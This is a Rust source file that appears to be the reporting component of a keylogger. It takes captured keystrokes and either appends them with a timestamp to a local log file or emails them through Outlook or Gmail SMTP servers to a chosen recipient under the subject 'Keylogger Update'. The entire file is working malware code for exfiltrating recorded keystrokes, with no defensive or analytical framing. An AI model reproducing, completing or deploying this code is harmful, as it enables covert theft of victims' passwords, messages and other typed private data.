use chrono::Local;
use lettre::message::{header, Mailbox, Message};
use lettre::transport::smtp::authentication::Credentials;
use lettre::{SmtpTransport, Transport};

use std::fs::OpenOptions;
use std::io::Write;
use std::io::{Error, ErrorKind, Result};

fn _get_smtp_server_and_port(email: &str) -> Result<(String, u16)> {
    if email.ends_with("@outlook.com") {
        return Ok(("smtp-mail.outlook.com".to_string(), 587));
    } else if email.ends_with("@gmail.com") {
        return Ok(("smtp.gmail.com".to_string(), 587));
    } else {
        return Err(Error::new(
            ErrorKind::Other,
            "Email domain provided doesn't have support yet",
        ));
    }
}

pub enum Method {
    File {
        path: String,
    },
    Email {
        email: String,
        password: String,
        recipient: String,
    },
}

impl Method {
    fn handle(&self, keys: &[String]) -> Result<()> {
        match self {
            Method::File { path } => {
                let mut file = OpenOptions::new().append(true).create(true).open(path)?;
                writeln!(
                    file,
                    "--------- {} ---------\n{}",
                    Local::now(),
                    keys.join("")
                )?;
            }
            Method::Email {
                email,
                password,
                recipient,
            } => {
                let email_packet = Message::builder()
                    .from(email.parse().unwrap())
                    .to(recipient.parse().unwrap())
                    .subject("Keylogger Update".to_string())
                    .header(header::ContentType::TEXT_PLAIN) // TEXT_HTML for HTML message
                    .body(format!(
                        "----------- {} -----------\n{}",
                        Local::now(),
                        keys.join("")
                    ))
                    .unwrap();
                let credentials = Credentials::new(email.to_string(), password.to_string());
                let (smtp_server, port) = _get_smtp_server_and_port(email)?;
                let mailer = SmtpTransport::relay(&smtp_server)
                    .unwrap()
                    .port(port)
                    .credentials(credentials)
                    .build();
                mailer.send(&email_packet).unwrap();
            }
        }
        Ok(())
    }
}
